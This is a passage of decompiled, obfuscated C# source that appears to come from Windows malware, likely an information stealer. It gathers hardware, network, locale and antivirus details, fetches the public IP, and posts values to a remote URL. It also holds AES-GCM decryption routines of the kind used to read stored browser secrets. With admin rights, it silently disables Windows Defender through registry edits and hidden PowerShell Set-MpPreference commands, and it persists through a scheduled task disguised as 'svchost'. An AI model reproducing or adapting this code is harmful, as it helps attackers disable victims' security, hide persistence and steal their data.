            string s = "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";
            byte[] byte_ = SHA256.Create().ComputeHash(Encoding.ASCII.GetBytes(s));
            byte[] byte_2 = new byte[16];
            return smethod_28(string_8, byte_, byte_2);
        }

        public static string smethod_28(string string_8, byte[] byte_0, byte[] byte_1)
        {
            Aes aes = Aes.Create();
            aes.Mode = CipherMode.CBC;
            byte[] array = new byte[32];
            Array.Copy(byte_0, 0, array, 0, 32);
            aes.Key = array;
            aes.IV = byte_1;
            MemoryStream memoryStream = new MemoryStream();
            ICryptoTransform transform = aes.CreateEncryptor();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
            byte[] bytes = Encoding.ASCII.GetBytes(string_8);
            cryptoStream.Write(bytes, 0, bytes.Length);
            cryptoStream.FlushFinalBlock();
            byte[] array2 = memoryStream.ToArray();
            memoryStream.Close();
            cryptoStream.Close();
            return Convert.ToBase64String(array2, 0, array2.Length);
        }

        public static string smethod_29(string string_8, byte[] byte_0, byte[] byte_1)
        {
            Aes aes = Aes.Create();
            aes.Mode = CipherMode.CBC;
            byte[] array = new byte[32];
            Array.Copy(byte_0, 0, array, 0, 32);
            aes.Key = array;
            aes.IV = byte_1;
            MemoryStream memoryStream = new MemoryStream();
            ICryptoTransform transform = aes.CreateDecryptor();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
            string empty = string.Empty;
            try
            {
                byte[] array2 = Convert.FromBase64String(string_8);
                cryptoStream.Write(array2, 0, array2.Length);
                cryptoStream.FlushFinalBlock();
                byte[] array3 = memoryStream.ToArray();
                return Encoding.ASCII.GetString(array3, 0, array3.Length);
            }
            finally
            {
                memoryStream.Close();
                cryptoStream.Close();
            }
        }

        private static string smethod_30(Process process_0)
        {
            string result;
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Format("SELECT CommandLine FROM Win32_Process WHERE ProcessId = {0}", process_0.Id)))
            {
                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                {
                    ManagementBaseObject managementBaseObject = managementObjectCollection.Cast<ManagementBaseObject>().SingleOrDefault<ManagementBaseObject>();
                    string text;
                    if (managementBaseObject == null)
                    {
                        text = null;
                    }
                    else
                    {
                        object obj = managementBaseObject["CommandLine"];
                        text = ((obj != null) ? obj.ToString() : null);
                    }
                    result = text;
                }
            }
            return result;
        }

        public static async Task<string> smethod_31(string string_8)
        {
            HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(string_8);
            obj.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
            using (HttpWebResponse httpWebResponse = (HttpWebResponse)(await obj.GetResponseAsync()))
            {
                using (Stream stream = httpWebResponse.GetResponseStream())
                {
                    using (StreamReader streamReader = new StreamReader(stream))
                    {
                        return await streamReader.ReadToEndAsync();
                    }
                }
            }
        }

        [DllImport("kernel32.dll")]
        private static extern int GetLocaleInfo(uint uint_2, uint uint_3, [Out] StringBuilder stringBuilder_0, int int_1);

        public static string smethod_32()
        {
            StringBuilder stringBuilder = new StringBuilder(256);
            int localeInfo = GetLocaleInfo(1024u, 4098u, stringBuilder, stringBuilder.Capacity);
            if (localeInfo > 0)
            {
                return stringBuilder.ToString().Substring(0, localeInfo - 1);
            }
            return string.Empty;
        }

        public static string smethod_33()
        {
            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
                return "Desktop";
            }
            return "Laptop";
        }

        public static string smethod_34()
        {
            NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
            int num = 0;
            NetworkInterface networkInterface;
            while (true)
            {
                if (num < allNetworkInterfaces.Length)
                {
                    networkInterface = allNetworkInterfaces[num];
                    if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
                    {
                        bool flag = false;
                        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
                        {
                            if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != 4294967295L)
                            {
                                flag = (unicastAddress.Address.ToString() == smethod_36());
                            }
                        }
                        if (flag)
                        {
                            break;
                        }
                    }
                    num++;
                    continue;
                }
                return "-";
            }
            return smethod_35(networkInterface.GetPhysicalAddress().ToString());
        }

        public static string smethod_35(string string_8)
        {
            if (string_8.Length == 12)
            {
                return Regex.Replace(string_8, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6");
            }
            return "00:00:00:00:00:00";
        }

        public static string smethod_36()
        {
            NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface networkInterface in allNetworkInterfaces)
            {
                if (networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault() == null || (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Wireless80211 && (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Ethernet || networkInterface.OperationalStatus != OperationalStatus.Up)))
                {
                    continue;
                }
                foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
                {
                    if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != 4294967295L)
                    {
                        return unicastAddress.Address.ToString();
                    }
                }
            }
            return "-";
        }

        public static string smethod_37()
        {
            try
            {
                string text = string.Empty;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
                {
                    foreach (ManagementObject item in managementObjectSearcher.Get())
                    {
                        text = string.Concat(text, item["Description"], "; ");
                    }
                }
                text = smethod_42(text);
                return (!string.IsNullOrEmpty(text)) ? text : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string smethod_38()
        {
            try
            {
                string text = string.Empty;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (ManagementObject item in managementObjectSearcher.Get())
                    {
                        text = string.Concat(text, item["Name"], "; ");
                    }
                }
                text = smethod_42(text);
                return (!string.IsNullOrEmpty(text)) ? text : "N/A";
            }
            catch
            {
            }
            return "Unknown";
        }

        public static string smethod_39()
        {
            try
            {
                string text = string.Empty;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
                {
                    using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
                    {
                        if (managementObjectEnumerator.MoveNext())
                        {
                            ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
                            text = string.Concat(managementObject["Manufacturer"], managementObject["SerialNumber"].ToString());
                        }
                    }
                }
                return (!string.IsNullOrEmpty(text)) ? text : "N/A";
            }
            catch
            {
            }
            return "Unknown";
        }

        public static string smethod_40()
        {
            try
            {
                string text = string.Empty;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
                    {
                        if (managementObjectEnumerator.MoveNext())
                        {
                            text = ((ManagementObject)managementObjectEnumerator.Current)["Manufacturer"].ToString();
                        }
                    }
                }
                return (!string.IsNullOrEmpty(text)) ? text : "N/A";
            }
            catch
            {
            }
            return "Unknown";
        }

        public static string smethod_41()
        {
            try
            {
                string text = string.Empty;
                string scope = GClass1.Boolean_4 ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string queryString = "SELECT * FROM FirewallProduct";
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, queryString))
                {
                    foreach (ManagementObject item in managementObjectSearcher.Get())
                    {
                        text = string.Concat(text, item["displayName"], "; ");
                    }
                }
                text = smethod_42(text);
                return (!string.IsNullOrEmpty(text)) ? text : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string smethod_42(string string_8, int int_1 = 2)
        {
            if (string_8.Length > int_1)
            {
                string_8 = string_8.Remove(string_8.Length - int_1);
            }
            return string_8;
        }

        public static string smethod_43()
        {
            try
            {
                string text = string.Empty;
                string scope = GClass1.Boolean_4 ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string queryString = "SELECT * FROM AntivirusProduct";
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, queryString))
                {
                    foreach (ManagementObject item in managementObjectSearcher.Get())
                    {
                        text = string.Concat(text, item["displayName"], "; ");
                    }
                }
                text = smethod_42(text);
                return (!string.IsNullOrEmpty(text)) ? text : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string smethod_44()
        {
            return new WebClient().DownloadString("https://ipv4bot.whatismyipaddress.com/");
        }
    }





    internal class Class2
    {
        public byte[] method_0(byte[] byte_0, byte[] byte_1, byte[] byte_2, byte[] byte_3, byte[] byte_4)
        {
            IntPtr intptr_ = method_2(GClass3.string_5, GClass3.string_6, GClass3.string_1);
            IntPtr intptr_2;
            IntPtr hglobal = method_3(intptr_, byte_0, out intptr_2);
            GClass3.GStruct1 gstruct1_ = new GClass3.GStruct1(byte_1, byte_2, byte_4);
            byte[] array2;
            using (gstruct1_)
            {
                byte[] array = new byte[method_1(intptr_)];
                int int_ = 0;
                uint num = GClass3.BCryptDecrypt(intptr_2, byte_3, byte_3.Length, ref gstruct1_, array, array.Length, null, 0, ref int_, 0);
                if (num != 0)
                {
                    throw new CryptographicException($"BCrypt.BCryptDecrypt() (get size) failed with status code: {num}");
                }
                array2 = new byte[int_];
                num = GClass3.BCryptDecrypt(intptr_2, byte_3, byte_3.Length, ref gstruct1_, array, array.Length, array2, array2.Length, ref int_, 0);
                if (num == GClass3.uint_3)
                {
                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
                }
                if (num != 0)
                {
                    throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{num}");
                }
            }
            GClass3.BCryptDestroyKey(intptr_2);
            Marshal.FreeHGlobal(hglobal);
            GClass3.BCryptCloseAlgorithmProvider(intptr_, 0u);
            return array2;
        }

        private int method_1(IntPtr intptr_0)
        {
            byte[] array = method_4(intptr_0, GClass3.string_2);
            return BitConverter.ToInt32(new byte[4]
            {
            array[4],
            array[5],
            array[6],
            array[7]
            }, 0);
        }

        private IntPtr method_2(string string_0, string string_1, string string_2)
        {
            IntPtr intptr_ = IntPtr.Zero;
            uint num = GClass3.BCryptOpenAlgorithmProvider(out intptr_, string_0, string_1, 0u);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{num}");
            }
            byte[] bytes = Encoding.Unicode.GetBytes(string_2);
            num = GClass3.BCryptSetProperty(intptr_, GClass3.string_3, bytes, bytes.Length, 0);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{num}");
            }
            return intptr_;
        }

        private IntPtr method_3(IntPtr intptr_0, byte[] byte_0, out IntPtr intptr_1)
        {
            int num = BitConverter.ToInt32(method_4(intptr_0, GClass3.string_0), 0);
            IntPtr intPtr = Marshal.AllocHGlobal(num);
            byte[] array = method_5(GClass3.byte_0, BitConverter.GetBytes(1), BitConverter.GetBytes(byte_0.Length), byte_0);
            uint num2 = GClass3.BCryptImportKey(intptr_0, IntPtr.Zero, GClass3.string_4, out intptr_1, intPtr, num, array, array.Length, 0u);
            if (num2 != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptImportKey() failed with status code:{num2}");
            }
            return intPtr;
        }

        private byte[] method_4(IntPtr intptr_0, string string_0)
        {
            int int_ = 0;
            uint num = GClass3.BCryptGetProperty(intptr_0, string_0, null, 0, ref int_, 0u);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptGetProperty() (get size) failed with status code:{num}");
            }
            byte[] array = new byte[int_];
            num = GClass3.BCryptGetProperty(intptr_0, string_0, array, array.Length, ref int_, 0u);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptGetProperty() failed with status code:{num}");
            }
            return array;
        }

        public byte[] method_5(params byte[][] byte_0)
        {
            int num = 0;
            byte[][] array = byte_0;
            foreach (byte[] array2 in array)
            {
                if (array2 != null)
                {
                    num += array2.Length;
                }
            }
            byte[] array3 = new byte[num - 1 + 1];
            int num2 = 0;
            array = byte_0;
            foreach (byte[] array4 in array)
            {
                if (array4 != null)
                {
                    Buffer.BlockCopy(array4, 0, array3, num2, array4.Length);
                    num2 += array4.Length;
                }
            }
            return array3;
        }
    }


    internal class Class3
    {
        public static void smethod_0()
        {
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                smethod_1("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
                smethod_1("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
                smethod_1("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                smethod_1("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
                smethod_1("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
                smethod_2();
                smethod_4();
                Process.Start(new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"svchost\" /sc ONLOGON /tr \"" + Assembly.GetExecutingAssembly().Location + "\" /rl HIGHEST /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
            }
        }

        private static void smethod_1(string string_0, string string_1, string string_2)
        {
            try
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (registryKey == null)
                    {
                        Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
                    }
                    else if (registryKey.GetValue(string_1) != string_2)
                    {
                        registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
                    }
                }
            }
            catch
            {
            }
        }

        private static void smethod_2()
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            while (!process.StandardOutput.EndOfStream)
            {
                string text = process.StandardOutput.ReadLine();
                if (text.Contains("DisableRealtimeMonitoring") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableRealtimeMonitoring $true");
                }
                else if (text.Contains("DisableBehaviorMonitoring") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableBehaviorMonitoring $true");
                }
                else if (text.Contains("DisableBlockAtFirstSeen") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableBlockAtFirstSeen $true");
                }
                else if (text.Contains("DisableIOAVProtection") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableIOAVProtection $true");
                }
                else if (text.Contains("DisablePrivacyMode") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisablePrivacyMode $true");
                }
                else if (text.Contains("SignatureDisableUpdateOnStartupWithoutEngine") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
                }
                else if (text.Contains("DisableArchiveScanning") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableArchiveScanning $true");
                }
                else if (text.Contains("DisableIntrusionPreventionSystem") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableIntrusionPreventionSystem $true");
                }
                else if (text.Contains("DisableScriptScanning") && text.Contains("False"))
                {
                    smethod_3("Set-MpPreference -DisableScriptScanning $true");
                }
                else if (text.Contains("SubmitSamplesConsent") && !text.Contains("2"))
                {
                    smethod_3("Set-MpPreference -SubmitSamplesConsent 2");
                }
                else if (text.Contains("MAPSReporting") && !text.Contains("0"))
                {
                    smethod_3("Set-MpPreference -MAPSReporting 0");
                }
                else if (text.Contains("HighThreatDefaultAction") && !text.Contains("6"))
                {
                    smethod_3("Set-MpPreference -HighThreatDefaultAction 6 -Force");
                }
                else if (text.Contains("ModerateThreatDefaultAction") && !text.Contains("6"))
                {
                    smethod_3("Set-MpPreference -ModerateThreatDefaultAction 6");
                }
                else if (text.Contains("LowThreatDefaultAction") && !text.Contains("6"))
                {
                    smethod_3("Set-MpPreference -LowThreatDefaultAction 6");
                }
                else if (text.Contains("SevereThreatDefaultAction") && !text.Contains("6"))
                {
                    smethod_3("Set-MpPreference -SevereThreatDefaultAction 6");
                }
            }
        }

        private static void smethod_3(string string_0)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = string_0,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };
            process.Start();
        }

        private static void smethod_4()
        {
            Task.Run(async delegate
            {
                try
                {
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "UpdateOnStartUp", 0, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "UpdateOnStartUp", 0, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "SecurityHealthService", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "SecurityHealthService", 4, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "WdNisSvc", 3, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "WdNisSvc", 3, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "WinDefend", 3, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "WinDefend", 3, RegistryValueKind.DWord);
                }
                catch (Exception)
                {
                }
            });
        }
    }

    [CompilerGenerated]
    internal sealed class Class4
    {
        // Token: 0x04000082 RID: 130 RVA: 0x00002050 File Offset: 0x00000250
        private static readonly Class4.Struct7 struct7_0;

        // Token: 0x0200001C RID: 28
        [StructLayout(LayoutKind.Explicit, Pack = 1, Size = 10)]
        private struct Struct7
        {
        }
    }



    public static class GClass0
    {
        public static byte[] smethod_0(string string_0, NameValueCollection nameValueCollection_0)
        {
            byte[] array = null;
            using (WebClient webClient = new WebClient())
            {
                return webClient.UploadValues(string_0, nameValueCollection_0);
            }
        }
    }



    public static class GClass1
    {
        [CompilerGenerated]
        private static readonly string string_0;

        [CompilerGenerated]
        private static readonly string string_1;

        [CompilerGenerated]
        private static readonly bool bool_0;

        [CompilerGenerated]
        private static readonly bool bool_1;

        [CompilerGenerated]
        private static readonly bool bool_2;

        [CompilerGenerated]
        private static readonly bool bool_3;

        [CompilerGenerated]
        private static readonly bool bool_4;

        [CompilerGenerated]
        private static readonly bool bool_5;

        [CompilerGenerated]
        private static readonly bool bool_6;

        [CompilerGenerated]
        private static readonly bool bool_7;

        private static readonly bool bool_8;

        public static string String_0
        {
            get;
        }

        public static string String_1
        {
            get;
        }

        public static bool Boolean_0
        {
            get;
        }

        public static bool Boolean_1
        {
            get;
        }

        public static bool Boolean_2
        {
            get;
        }

        public static bool Boolean_3
        {
            get;
        }

        public static bool Boolean_4
        {
            get;
        }

        public static bool Boolean_5
        {
            get;
        }

        public static bool Boolean_6
        {
            get;
        }

        public static bool Boolean_7
        {
            get;
        }

        public static bool Boolean_8
        {
            [CompilerGenerated]
            get
            {
                return bool_8;
            }
        }

        static GClass1()
        {
            bool_2 = (Environment.OSVersion.Platform == PlatformID.Win32NT);
            bool_3 = (Boolean_2 && Environment.OSVersion.Version.Major >= 5);
            bool_4 = (Boolean_2 && Environment.OSVersion.Version.Major >= 6);
            bool_5 = (Boolean_2 && Environment.OSVersion.Version >= new Version(6, 1));
            bool_6 = (Boolean_2 && Environment.OSVersion.Version >= new Version(6, 2, 9200));
            bool_7 = (Boolean_2 && Environment.OSVersion.Version >= new Version(6, 3));
            bool_8 = (Boolean_2 && Environment.OSVersion.Version >= new Version(10, 0));
            bool_1 = (Type.GetType("Mono.Runtime") != null);
            string_1 = "Unknown OS";
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
            {
                using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
                {
                    if (managementObjectEnumerator.MoveNext())
                    {
                        string_1 = ((ManagementObject)managementObjectEnumerator.Current)["Caption"].ToString();
                    }
                }
            }
            string_1 = Regex.Replace(String_1, "^.*(?=Windows)", "").TrimEnd().TrimStart();
            bool_0 = Environment.Is64BitOperatingSystem;
            string_0 = $"{String_1} {(Boolean_0 ? 64 : 32)} Bit";
        }
    }



    public class GClass2
    {
        [CompilerGenerated]
        private string string_0;

        [CompilerGenerated]
        private string string_1;

        [CompilerGenerated]
        private string string_2;

        [CompilerGenerated]
        private string string_3;

        public string String_0
        {
            get;
            set;
        }

        public string String_1
        {
            get;
            set;
        }

        public string String_2
        {
            get;
            set;
        }

        public string String_3
        {
            get;
            set;
        }
    }



    public static class GClass3
    {
        public struct GStruct0
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string string_0;

            public int int_0;

            public GStruct0(string string_1, int int_1)
            {
                string_0 = string_1;
                int_0 = int_1;
            }
        }

        public struct GStruct1 : IDisposable
        {
            public int int_0;

            public int int_1;

            public IntPtr intptr_0;

            public int int_2;

            public IntPtr intptr_1;

            public int int_3;

            public IntPtr intptr_2;

            public int int_4;

            public IntPtr intptr_3;

